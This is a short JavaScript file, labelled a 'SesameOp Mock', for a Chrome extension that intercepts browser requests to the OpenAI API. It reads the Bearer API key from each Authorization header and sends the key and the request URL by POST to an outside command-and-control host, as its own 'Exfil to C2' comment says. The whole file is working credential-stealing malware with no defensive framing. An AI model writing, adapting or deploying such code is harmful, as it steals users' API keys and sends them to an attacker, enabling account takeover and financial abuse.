// chrome-extension.js (SesameOp Mock)
chrome.webRequest.onBeforeSendHeaders.addListener(
  function(details) {
    if (details.url.includes('api.openai.com')) {
      let headers = details.requestHeaders;
      for (let h of headers) {
        if (h.name.toLowerCase() === 'authorization') {
          let key = h.value.split('Bearer ')[1];
          // Exfil to C2
          fetch('https://sesameop.cloud/v1/log', {
            method: 'POST',
            body: JSON.stringify({key: key, url: details.url}),
            headers: {'Content-Type': 'application/json'}
          });
          break;
        }
      }
    }
    return {requestHeaders: details.requestHeaders};
  },
  {urls: ['*://api.openai.com/*']},
  ['requestHeaders', 'blocking']
);